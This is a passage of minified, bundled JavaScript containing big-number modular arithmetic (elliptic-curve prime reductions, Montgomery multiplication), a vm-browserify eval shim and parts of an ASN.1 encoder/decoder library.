                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = U.clone(); L.cmpn(1) > 0 && U.cmpn(1) > 0; ) {
                    for (var de = 0, re = 1; (L.words[0] & re) === 0 && de < 26; ++de,
                    re <<= 1)
                        ;
                    if (de > 0)
                        for (L.iushrn(de); de-- > 0; )
                            Z.isOdd() && Z.iadd(se),
                            Z.iushrn(1);
                    for (var $ = 0, ie = 1; (U.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (U.iushrn($); $-- > 0; )
                            te.isOdd() && te.iadd(se),
                            te.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(te)) : (U.isub(L),
                    te.isub(Z))
                }
                var ve;
                return L.cmpn(1) === 0 ? ve = Z : ve = te,
                ve.cmpn(0) < 0 && ve.iadd(q),
                ve
            }
            ,
            w.prototype.gcd = function(q) {
                if (this.isZero())
                    return q.abs();
                if (q.isZero())
                    return this.abs();
                var L = this.clone()
                  , U = q.clone();
                L.negative = 0,
                U.negative = 0;
                for (var Z = 0; L.isEven() && U.isEven(); Z++)
                    L.iushrn(1),
                    U.iushrn(1);
                do {
                    for (; L.isEven(); )
                        L.iushrn(1);
                    for (; U.isEven(); )
                        U.iushrn(1);
                    var te = L.cmp(U);
                    if (te < 0) {
                        var se = L;
                        L = U,
                        U = se
                    } else if (te === 0 || U.cmpn(1) === 0)
                        break;
                    L.isub(U)
                } while (!0);
                return U.iushln(Z)
            }
            ,
            w.prototype.invm = function(q) {
                return this.egcd(q).a.umod(q)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(q) {
                return this.words[0] & q
            }
            ,
            w.prototype.bincn = function(q) {
                O(typeof q == "number");
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return this._expand(U + 1),
                    this.words[U] |= Z,
                    this;
                for (var te = Z, se = U; te !== 0 && se < this.length; se++) {
                    var de = this.words[se] | 0;
                    de += te,
                    te = de >>> 26,
                    de &= 67108863,
                    this.words[se] = de
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(q) {
                var L = q < 0;
                if (this.negative !== 0 && !L)
                    return -1;
                if (this.negative === 0 && L)
                    return 1;
                this.strip();
                var U;
                if (this.length > 1)
                    U = 1;
                else {
                    L && (q = -q),
                    O(q <= 67108863, "Number is too big");
                    var Z = this.words[0] | 0;
                    U = Z === q ? 0 : Z < q ? -1 : 1
                }
                return this.negative !== 0 ? -U | 0 : U
            }
            ,
            w.prototype.cmp = function(q) {
                if (this.negative !== 0 && q.negative === 0)
                    return -1;
                if (this.negative === 0 && q.negative !== 0)
                    return 1;
                var L = this.ucmp(q);
                return this.negative !== 0 ? -L | 0 : L
            }
            ,
            w.prototype.ucmp = function(q) {
                if (this.length > q.length)
                    return 1;
                if (this.length < q.length)
                    return -1;
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = this.words[U] | 0
                      , te = q.words[U] | 0;
                    if (Z !== te) {
                        Z < te ? L = -1 : Z > te && (L = 1);
                        break
                    }
                }
                return L
            }
            ,
            w.prototype.gtn = function(q) {
                return this.cmpn(q) === 1
            }
            ,
            w.prototype.gt = function(q) {
                return this.cmp(q) === 1
            }
            ,
            w.prototype.gten = function(q) {
                return this.cmpn(q) >= 0
            }
            ,
            w.prototype.gte = function(q) {
                return this.cmp(q) >= 0
            }
            ,
            w.prototype.ltn = function(q) {
                return this.cmpn(q) === -1
            }
            ,
            w.prototype.lt = function(q) {
                return this.cmp(q) === -1
            }
            ,
            w.prototype.lten = function(q) {
                return this.cmpn(q) <= 0
            }
            ,
            w.prototype.lte = function(q) {
                return this.cmp(q) <= 0
            }
            ,
            w.prototype.eqn = function(q) {
                return this.cmpn(q) === 0
            }
            ,
            w.prototype.eq = function(q) {
                return this.cmp(q) === 0
            }
            ,
            w.red = function(q) {
                return new Ee(q)
            }
            ,
            w.prototype.toRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                q.convertTo(this)._forceRed(q)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(q) {
                return this.red = q,
                this
            }
            ,
            w.prototype.forceRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(q)
            }
            ,
            w.prototype.redAdd = function(q) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, q)
            }
            ,
            w.prototype.redIAdd = function(q) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, q)
            }
            ,
            w.prototype.redSub = function(q) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, q)
            }
            ,
            w.prototype.redISub = function(q) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, q)
            }
            ,
            w.prototype.redShl = function(q) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, q)
            }
            ,
            w.prototype.redMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.mul(this, q)
            }
            ,
            w.prototype.redIMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.imul(this, q)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(q) {
                return O(this.red && !q.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, q)
            }
            ;
            var he = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function pe(ce, q) {
                this.name = ce,
                this.p = new w(q,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            pe.prototype._tmp = function() {
                var q = new w(null);
                return q.words = new Array(Math.ceil(this.n / 13)),
                q
            }
            ,
            pe.prototype.ireduce = function(q) {
                var L = q, U;
                do
                    this.split(L, this.tmp),
                    L = this.imulK(L),
                    L = L.iadd(this.tmp),
                    U = L.bitLength();
                while (U > this.n);
                var Z = U < this.n ? -1 : L.ucmp(this.p);
                return Z === 0 ? (L.words[0] = 0,
                L.length = 1) : Z > 0 ? L.isub(this.p) : L.strip !== void 0 ? L.strip() : L._strip(),
                L
            }
            ,
            pe.prototype.split = function(q, L) {
                q.iushrn(this.n, 0, L)
            }
            ,
            pe.prototype.imulK = function(q) {
                return q.imul(this.k)
            }
            ;
            function ye() {
                pe.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(ye, pe),
            ye.prototype.split = function(q, L) {
                for (var U = 4194303, Z = Math.min(q.length, 9), te = 0; te < Z; te++)
                    L.words[te] = q.words[te];
                if (L.length = Z,
                q.length <= 9) {
                    q.words[0] = 0,
                    q.length = 1;
                    return
                }
                var se = q.words[9];
                for (L.words[L.length++] = se & U,
                te = 10; te < q.length; te++) {
                    var de = q.words[te] | 0;
                    q.words[te - 10] = (de & U) << 4 | se >>> 22,
                    se = de
                }
                se >>>= 22,
                q.words[te - 10] = se,
                se === 0 && q.length > 10 ? q.length -= 10 : q.length -= 9
            }
            ,
            ye.prototype.imulK = function(q) {
                q.words[q.length] = 0,
                q.words[q.length + 1] = 0,
                q.length += 2;
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = q.words[U] | 0;
                    L += Z * 977,
                    q.words[U] = L & 67108863,
                    L = Z * 64 + (L / 67108864 | 0)
                }
                return q.words[q.length - 1] === 0 && (q.length--,
                q.words[q.length - 1] === 0 && q.length--),
                q
            }
            ;
            function be() {
                pe.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(be, pe);
            function xe() {
                pe.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(xe, pe);
            function Ae() {
                pe.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Ae, pe),
            Ae.prototype.imulK = function(q) {
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = (q.words[U] | 0) * 19 + L
                      , te = Z & 67108863;
                    Z >>>= 26,
                    q.words[U] = te,
                    L = Z
                }
                return L !== 0 && (q.words[q.length++] = L),
                q
            }
            ,
            w._prime = function(q) {
                if (he[q])
                    return he[q];
                var L;
                if (q === "k256")
                    L = new ye;
                else if (q === "p224")
                    L = new be;
                else if (q === "p192")
                    L = new xe;
                else if (q === "p25519")
                    L = new Ae;
                else
                    throw new Error("Unknown prime " + q);
                return he[q] = L,
                L
            }
            ;
            function Ee(ce) {
                if (typeof ce == "string") {
                    var q = w._prime(ce);
                    this.m = q.p,
                    this.prime = q
                } else
                    O(ce.gtn(1), "modulus must be greater than 1"),
                    this.m = ce,
                    this.prime = null
            }
            Ee.prototype._verify1 = function(q) {
                O(q.negative === 0, "red works only with positives"),
                O(q.red, "red works only with red numbers")
            }
            ,
            Ee.prototype._verify2 = function(q, L) {
                O((q.negative | L.negative) === 0, "red works only with positives"),
                O(q.red && q.red === L.red, "red works only with red numbers")
            }
            ,
            Ee.prototype.imod = function(q) {
                return this.prime ? this.prime.ireduce(q)._forceRed(this) : q.umod(this.m)._forceRed(this)
            }
            ,
            Ee.prototype.neg = function(q) {
                return q.isZero() ? q.clone() : this.m.sub(q)._forceRed(this)
            }
            ,
            Ee.prototype.add = function(q, L) {
                this._verify2(q, L);
                var U = q.add(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.iadd = function(q, L) {
                this._verify2(q, L);
                var U = q.iadd(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U
            }
            ,
            Ee.prototype.sub = function(q, L) {
                this._verify2(q, L);
                var U = q.sub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.isub = function(q, L) {
                this._verify2(q, L);
                var U = q.isub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U
            }
            ,
            Ee.prototype.shl = function(q, L) {
                return this._verify1(q),
                this.imod(q.ushln(L))
            }
            ,
            Ee.prototype.imul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.imul(L))
            }
            ,
            Ee.prototype.mul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.mul(L))
            }
            ,
            Ee.prototype.isqr = function(q) {
                return this.imul(q, q.clone())
            }
            ,
            Ee.prototype.sqr = function(q) {
                return this.mul(q, q)
            }
            ,
            Ee.prototype.sqrt = function(q) {
                if (q.isZero())
                    return q.clone();
                var L = this.m.andln(3);
                if (O(L % 2 === 1),
                L === 3) {
                    var U = this.m.add(new w(1)).iushrn(2);
                    return this.pow(q, U)
                }
                for (var Z = this.m.subn(1), te = 0; !Z.isZero() && Z.andln(1) === 0; )
                    te++,
                    Z.iushrn(1);
                O(!Z.isZero());
                var se = new w(1).toRed(this)
                  , de = se.redNeg()
                  , re = this.m.subn(1).iushrn(1)
                  , $ = this.m.bitLength();
                for ($ = new w(2 * $ * $).toRed(this); this.pow($, re).cmp(de) !== 0; )
                    $.redIAdd(de);
                for (var ie = this.pow($, Z), ve = this.pow(q, Z.addn(1).iushrn(1)), ge = this.pow(q, Z), Re = te; ge.cmp(se) !== 0; ) {
                    for (var Pe = ge, Ie = 0; Pe.cmp(se) !== 0; Ie++)
                        Pe = Pe.redSqr();
                    O(Ie < Re);
                    var Te = this.pow(ie, new w(1).iushln(Re - Ie - 1));
                    ve = ve.redMul(Te),
                    ie = Te.redSqr(),
                    ge = ge.redMul(ie),
                    Re = Ie
                }
                return ve
            }
            ,
            Ee.prototype.invm = function(q) {
                var L = q._invmp(this.m);
                return L.negative !== 0 ? (L.negative = 0,
                this.imod(L).redNeg()) : this.imod(L)
            }
            ,
            Ee.prototype.pow = function(q, L) {
                if (L.isZero())
                    return new w(1).toRed(this);
                if (L.cmpn(1) === 0)
                    return q.clone();
                var U = 4
                  , Z = new Array(1 << U);
                Z[0] = new w(1).toRed(this),
                Z[1] = q;
                for (var te = 2; te < Z.length; te++)
                    Z[te] = this.mul(Z[te - 1], q);
                var se = Z[0]
                  , de = 0
                  , re = 0
                  , $ = L.bitLength() % 26;
                for ($ === 0 && ($ = 26),
                te = L.length - 1; te >= 0; te--) {
                    for (var ie = L.words[te], ve = $ - 1; ve >= 0; ve--) {
                        var ge = ie >> ve & 1;
                        if (se !== Z[0] && (se = this.sqr(se)),
                        ge === 0 && de === 0) {
                            re = 0;
                            continue
                        }
                        de <<= 1,
                        de |= ge,
                        re++,
                        !(re !== U && (te !== 0 || ve !== 0)) && (se = this.mul(se, Z[de]),
                        re = 0,
                        de = 0)
                    }
                    $ = 26
                }
                return se
            }
            ,
            Ee.prototype.convertTo = function(q) {
                var L = q.umod(this.m);
                return L === q ? L.clone() : L
            }
            ,
            Ee.prototype.convertFrom = function(q) {
                var L = q.clone();
                return L.red = null,
                L
            }
            ,
            w.mont = function(q) {
                return new Be(q)
            }
            ;
            function Be(ce) {
                Ee.call(this, ce),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(Be, Ee),
            Be.prototype.convertTo = function(q) {
                return this.imod(q.ushln(this.shift))
            }
            ,
            Be.prototype.convertFrom = function(q) {
                var L = this.imod(q.mul(this.rinv));
                return L.red = null,
                L
            }
            ,
            Be.prototype.imul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return q.words[0] = 0,
                    q.length = 1,
                    q;
                var U = q.imul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.mul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return new w(0)._forceRed(this);
                var U = q.mul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.invm = function(q) {
                var L = this.imod(q._invmp(this.m).mul(this.r2));
                return L._forceRed(this)
            }
        }
        )(_, bn$4)
    }(bn$5)),
    bn$5.exports
}
var api$1 = {}, vmBrowserify = {}, hasRequiredVmBrowserify;
function requireVmBrowserify() {
    return hasRequiredVmBrowserify || (hasRequiredVmBrowserify = 1,
    function(exports) {
        var indexOf = function(_, M) {
            if (_.indexOf)
                return _.indexOf(M);
            for (var j = 0; j < _.length; j++)
                if (_[j] === M)
                    return j;
            return -1
        }
          , Object_keys = function(_) {
            if (Object.keys)
                return Object.keys(_);
            var M = [];
            for (var j in _)
                M.push(j);
            return M
        }
          , forEach = function(_, M) {
            if (_.forEach)
                return _.forEach(M);
            for (var j = 0; j < _.length; j++)
                M(_[j], j, _)
        }
          , defineProp = function() {
            try {
                return Object.defineProperty({}, "_", {}),
                function(_, M, j) {
                    Object.defineProperty(_, M, {
                        writable: !0,
                        enumerable: !1,
                        configurable: !0,
                        value: j
                    })
                }
            } catch {
                return function(M, j, O) {
                    M[j] = O
                }
            }
        }()
          , globals = ["Array", "Boolean", "Date", "Error", "EvalError", "Function", "Infinity", "JSON", "Math", "NaN", "Number", "Object", "RangeError", "ReferenceError", "RegExp", "String", "SyntaxError", "TypeError", "URIError", "decodeURI", "decodeURIComponent", "encodeURI", "encodeURIComponent", "escape", "eval", "isFinite", "isNaN", "parseFloat", "parseInt", "undefined", "unescape"];
        function Context() {}
        Context.prototype = {};
        var Script = exports.Script = function(M) {
            if (!(this instanceof Script))
                return new Script(M);
            this.code = M
        }
        ;
        Script.prototype.runInContext = function(_) {
            if (!(_ instanceof Context))
                throw new TypeError("needs a 'context' argument.");
            var M = document.createElement("iframe");
            M.style || (M.style = {}),
            M.style.display = "none",
            document.body.appendChild(M);
            var j = M.contentWindow
              , O = j.eval
              , x = j.execScript;
            !O && x && (x.call(j, "null"),
            O = j.eval),
            forEach(Object_keys(_), function(X) {
                j[X] = _[X]
            }),
            forEach(globals, function(X) {
                _[X] && (j[X] = _[X])
            });
            var w = Object_keys(j)
              , b = O.call(j, this.code);
            return forEach(Object_keys(j), function(X) {
                (X in _ || indexOf(w, X) === -1) && (_[X] = j[X])
            }),
            forEach(globals, function(X) {
                X in _ || defineProp(_, X, j[X])
            }),
            document.body.removeChild(M),
            b
        }
        ,
        Script.prototype.runInThisContext = function() {
            return eval(this.code)
        }
        ,
        Script.prototype.runInNewContext = function(_) {
            var M = Script.createContext(_)
              , j = this.runInContext(M);
            return _ && forEach(Object_keys(M), function(O) {
                _[O] = M[O]
            }),
            j
        }
        ,
        forEach(Object_keys(Script.prototype), function(_) {
            exports[_] = Script[_] = function(M) {
                var j = Script(M);
                return j[_].apply(j, [].slice.call(arguments, 1))
            }
        }),
        exports.isContext = function(_) {
            return _ instanceof Context
        }
        ,
        exports.createScript = function(_) {
            return exports.Script(_)
        }
        ,
        exports.createContext = Script.createContext = function(_) {
            var M = new Context;
            return typeof _ == "object" && forEach(Object_keys(_), function(j) {
                M[j] = _[j]
            }),
            M
        }
    }(vmBrowserify)),
    vmBrowserify
}
var hasRequiredApi;
function requireApi() {
    return hasRequiredApi || (hasRequiredApi = 1,
    function(_) {
        var M = requireAsn1$1()
          , j = requireInherits_browser()
          , O = _;
        O.define = function(b, X) {
            return new x(b,X)
        }
        ;
        function x(w, b) {
            this.name = w,
            this.body = b,
            this.decoders = {},
            this.encoders = {}
        }
        x.prototype._createNamed = function(b) {
            var X;
            try {
                X = requireVmBrowserify().runInThisContext("(function " + this.name + `(entity) {
  this._initNamed(entity);
})`)
            } catch {
                X = function(F) {
                    this._initNamed(F)
                }
            }
            return j(X, b),
            X.prototype._initNamed = function(F) {
                b.call(this, F)
            }
            ,
            new X(this)
        }
        ,
        x.prototype._getDecoder = function(b) {
            return b = b || "der",
            this.decoders.hasOwnProperty(b) || (this.decoders[b] = this._createNamed(M.decoders[b])),
            this.decoders[b]
        }
        ,
        x.prototype.decode = function(b, X, Y) {
            return this._getDecoder(X).decode(b, Y)
        }
        ,
        x.prototype._getEncoder = function(b) {
            return b = b || "der",
            this.encoders.hasOwnProperty(b) || (this.encoders[b] = this._createNamed(M.encoders[b])),
            this.encoders[b]
        }
        ,
        x.prototype.encode = function(b, X, Y) {
            return this._getEncoder(X).encode(b, Y)
        }
    }(api$1)),
    api$1
}
var base = {}, reporter = {}, hasRequiredReporter;
function requireReporter() {
    if (hasRequiredReporter)
        return reporter;
    hasRequiredReporter = 1;
    var _ = requireInherits_browser();
    function M(O) {
        this._reporterState = {
            obj: null,
            path: [],
            options: O || {},
            errors: []
        }
    }
    reporter.Reporter = M,
    M.prototype.isError = function(x) {
        return x instanceof j
    }
    ,
    M.prototype.save = function() {
        var x = this._reporterState;
        return {
            obj: x.obj,
            pathLen: x.path.length
        }
    }
    ,
    M.prototype.restore = function(x) {
        var w = this._reporterState;
        w.obj = x.obj,
        w.path = w.path.slice(0, x.pathLen)
    }
    ,
    M.prototype.enterKey = function(x) {
        return this._reporterState.path.push(x)
    }
    ,
    M.prototype.exitKey = function(x) {
        var w = this._reporterState;
        w.path = w.path.slice(0, x - 1)
    }
    ,
    M.prototype.leaveKey = function(x, w, b) {
        var X = this._reporterState;
        this.exitKey(x),
        X.obj !== null && (X.obj[w] = b)
    }
    ,
    M.prototype.path = function() {
        return this._reporterState.path.join("/")
    }
    ,
    M.prototype.enterObject = function() {
        var x = this._reporterState
          , w = x.obj;
        return x.obj = {},
        w
    }
    ,
    M.prototype.leaveObject = function(x) {
        var w = this._reporterState
          , b = w.obj;
        return w.obj = x,
        b
    }
    ,
    M.prototype.error = function(x) {
        var w, b = this._reporterState, X = x instanceof j;
        if (X ? w = x : w = new j(b.path.map(function(Y) {
            return "[" + JSON.stringify(Y) + "]"
        }).join(""),x.message || x,x.stack),
        !b.options.partial)
            throw w;
        return X || b.errors.push(w),
        w
    }
    ,
    M.prototype.wrapResult = function(x) {
        var w = this._reporterState;
        return w.options.partial ? {
            result: this.isError(x) ? null : x,
            errors: w.errors
        } : x
    }
    ;
    function j(O, x) {
        this.path = O,
        this.rethrow(x)
    }
    return _(j, Error),
    j.prototype.rethrow = function(x) {
        if (this.message = x + " at: " + (this.path || "(shallow)"),
        Error.captureStackTrace && Error.captureStackTrace(this, j),
        !this.stack)
            try {
                throw new Error(this.message)
            } catch (w) {
                this.stack = w.stack
            }
        return this
    }
    ,
    reporter
}
var buffer = {}, hasRequiredBuffer;
function requireBuffer() {
    if (hasRequiredBuffer)
        return buffer;
    hasRequiredBuffer = 1;
    var _ = requireInherits_browser()
      , M = requireBase().Reporter
      , j = requireDist$4().Buffer;
    function O(w, b) {
        if (M.call(this, b),
        !j.isBuffer(w)) {
            this.error("Input not Buffer");
            return
        }
        this.base = w,
        this.offset = 0,
        this.length = w.length
    }
    _(O, M),
    buffer.DecoderBuffer = O,
    O.prototype.save = function() {
        return {
            offset: this.offset,
            reporter: M.prototype.save.call(this)
        }
    }
    ,
    O.prototype.restore = function(b) {
        var X = new O(this.base);
        return X.offset = b.offset,
        X.length = this.offset,
        this.offset = b.offset,
        M.prototype.restore.call(this, b.reporter),
        X
    }
    ,
    O.prototype.isEmpty = function() {
        return this.offset === this.length
    }
    ,
    O.prototype.readUInt8 = function(b) {
        return this.offset + 1 <= this.length ? this.base.readUInt8(this.offset++, !0) : this.error(b || "DecoderBuffer overrun")
    }
    ,
    O.prototype.skip = function(b, X) {
        if (!(this.offset + b <= this.length))
            return this.error(X || "DecoderBuffer overrun");
        var Y = new O(this.base);
        return Y._reporterState = this._reporterState,
        Y.offset = this.offset,
        Y.length = this.offset + b,
        this.offset += b,
        Y
    }
    ,
    O.prototype.raw = function(b) {
        return this.base.slice(b ? b.offset : this.offset, this.length)
    }
    ;
    function x(w, b) {
        if (Array.isArray(w))
            this.length = 0,
            this.value = w.map(function(X) {
                return X instanceof x || (X = new x(X,b)),
                this.length += X.length,
                X
            }, this);
        else if (typeof w == "number") {
            if (!(0 <= w && w <= 255))
                return b.error("non-byte EncoderBuffer value");
            this.value = w,
            this.length = 1
        } else if (typeof w == "string")
            this.value = w,
            this.length = j.byteLength(w);
        else if (j.isBuffer(w))
            this.value = w,
            this.length = w.length;
        else
            return b.error("Unsupported type: " + typeof w)
    }
    return buffer.EncoderBuffer = x,
    x.prototype.join = function(b, X) {
        return b || (b = new j(this.length)),
        X || (X = 0),
        this.length === 0 || (Array.isArray(this.value) ? this.value.forEach(function(Y) {
            Y.join(b, X),
            X += Y.length
        }) : (typeof this.value == "number" ? b[X] = this.value : typeof this.value == "string" ? b.write(this.value, X) : j.isBuffer(this.value) && this.value.copy(b, X),
        X += this.length)),
        b
    }
    ,
    buffer
}
var node, hasRequiredNode;
function requireNode() {
    if (hasRequiredNode)
        return node;
    hasRequiredNode = 1;
    var _ = requireBase().Reporter
      , M = requireBase().EncoderBuffer
      , j = requireBase().DecoderBuffer
      , O = requireMinimalisticAssert()
      , x = ["seq", "seqof", "set", "setof", "objid", "bool", "gentime", "utctime", "null_", "enum", "int", "objDesc", "bitstr", "bmpstr", "charstr", "genstr", "graphstr", "ia5str", "iso646str", "numstr", "octstr", "printstr", "t61str", "unistr", "utf8str", "videostr"]
      , w = ["key", "obj", "use", "optional", "explicit", "implicit", "def", "choice", "any", "contains"].concat(x)
      , b = ["_peekTag", "_decodeTag", "_use", "_decodeStr", "_decodeObjid", "_decodeTime", "_decodeNull", "_decodeInt", "_decodeBool", "_decodeList", "_encodeComposite", "_encodeStr", "_encodeObjid", "_encodeTime", "_encodeNull", "_encodeInt", "_encodeBool"];
    function X(F, V) {
        var K = {};
        this._baseState = K,
        K.enc = F,
        K.parent = V || null,
        K.children = null,
        K.tag = null,
        K.args = null,
        K.reverseArgs = null,
        K.choice = null,
        K.optional = !1,
        K.any = !1,
        K.obj = !1,
        K.use = null,
        K.useDecoder = null,
        K.key = null,
        K.default = null,
        K.explicit = null,
        K.implicit = null,
        K.contains = null,
        K.parent || (K.children = [],
        this._wrap())
    }
    node = X;
    var Y = ["enc", "parent", "children", "tag", "args", "reverseArgs", "choice", "optional", "any", "obj", "use", "alteredUse", "key", "default", "explicit", "implicit", "contains"];
    return X.prototype.clone = function() {
        var V = this._baseState
          , K = {};
        Y.forEach(function(ee) {
            K[ee] = V[ee]
        });
        var Q = new this.constructor(K.parent);
        return Q._baseState = K,
        Q
    }
    ,
    X.prototype._wrap = function() {
        var V = this._baseState;
        w.forEach(function(K) {
            this[K] = function() {
                var ee = new this.constructor(this);
                return V.children.push(ee),
                ee[K].apply(ee, arguments)
            }
        }, this)
    }
    ,
    X.prototype._init = function(V) {
        var K = this._baseState;
        O(K.parent === null),
        V.call(this),
        K.children = K.children.filter(function(Q) {
            return Q._baseState.parent === this
        }, this),
        O.equal(K.children.length, 1, "Root node can have only one child")
    }
    ,
    X.prototype._useArgs = function(V) {
        var K = this._baseState
          , Q = V.filter(function(ee) {
            return ee instanceof this.constructor
        }, this);
        V = V.filter(function(ee) {
            return !(ee instanceof this.constructor)
        }, this),
        Q.length !== 0 && (O(K.children === null),
        K.children = Q,
        Q.forEach(function(ee) {
            ee._baseState.parent = this
        }, this)),
        V.length !== 0 && (O(K.args === null),
        K.args = V,
        K.reverseArgs = V.map(function(ee) {
            if (typeof ee != "object" || ee.constructor !== Object)
                return ee;
            var ae = {};
            return Object.keys(ee).forEach(function(ne) {
                ne == (ne | 0) && (ne |= 0);
                var oe = ee[ne];
                ae[oe] = ne
            }),
            ae
        }))
    }
    ,
    b.forEach(function(F) {
        X.prototype[F] = function() {
            var K = this._baseState;
            throw new Error(F + " not implemented for encoding: " + K.enc)
        }
    }),
    x.forEach(function(F) {
        X.prototype[F] = function() {
            var K = this._baseState
              , Q = Array.prototype.slice.call(arguments);
            return O(K.tag === null),
            K.tag = F,
            this._useArgs(Q),
            this
        }
    }),
    X.prototype.use = function(V) {
        O(V);
        var K = this._baseState;
        return O(K.use === null),
        K.use = V,
        this
    }
    ,
    X.prototype.optional = function() {
        var V = this._baseState;
        return V.optional = !0,
        this
    }
    ,
    X.prototype.def = function(V) {
        var K = this._baseState;
        return O(K.default === null),
        K.default = V,
        K.optional = !0,
        this
    }
    ,
    X.prototype.explicit = function(V) {
        var K = this._baseState;
        return O(K.explicit === null && K.implicit === null),
        K.explicit = V,
        this
    }
    ,
    X.prototype.implicit = function(V) {
        var K = this._baseState;
        return O(K.explicit === null && K.implicit === null),
        K.implicit = V,
        this
    }
    ,
    X.prototype.obj = function() {
        var V = this._baseState
          , K = Array.prototype.slice.call(arguments);
        return V.obj = !0,
        K.length !== 0 && this._useArgs(K),
        this
    }
    ,
    X.prototype.key = function(V) {
        var K = this._baseState;
        return O(K.key === null),
        K.key = V,
        this
    }
    ,
    X.prototype.any = function() {
        var V = this._baseState;
        return V.any = !0,
        this
    }
    ,
    X.prototype.choice = function(V) {
        var K = this._baseState;
        return O(K.choice === null),
        K.choice = V,
        this._useArgs(Object.keys(V).map(function(Q) {
            return V[Q]
        })),
        this
    }
    ,
    X.prototype.contains = function(V) {
        var K = this._baseState;
        return O(K.use === null),
        K.contains = V,
        this
    }
    ,
    X.prototype._decode = function(V, K) {
        var Q = this._baseState;
        if (Q.parent === null)
            return V.wrapResult(Q.children[0]._decode(V, K));
        var ee = Q.default
          , ae = !0
          , ne = null;
        if (Q.key !== null && (ne = V.enterKey(Q.key)),
        Q.optional) {
            var oe = null;
            if (Q.explicit !== null ? oe = Q.explicit : Q.implicit !== null ? oe = Q.implicit : Q.tag !== null && (oe = Q.tag),
            oe === null && !Q.any) {
                var ue = V.save();
                try {
                    Q.choice === null ? this._decodeGeneric(Q.tag, V, K) : this._decodeChoice(V, K),
                    ae = !0
                } catch {
                    ae = !1
                }
                V.restore(ue)
            } else if (ae = this._peekTag(V, oe, Q.any),
            V.isError(ae))
                return ae
        }
        var fe;
        if (Q.obj && ae && (fe = V.enterObject()),
        ae) {
            if (Q.explicit !== null) {
                var he = this._decodeTag(V, Q.explicit);
                if (V.isError(he))
                    return he;
                V = he
            }
            var pe = V.offset;
            if (Q.use === null && Q.choice === null) {
                if (Q.any)
                    var ue = V.save();
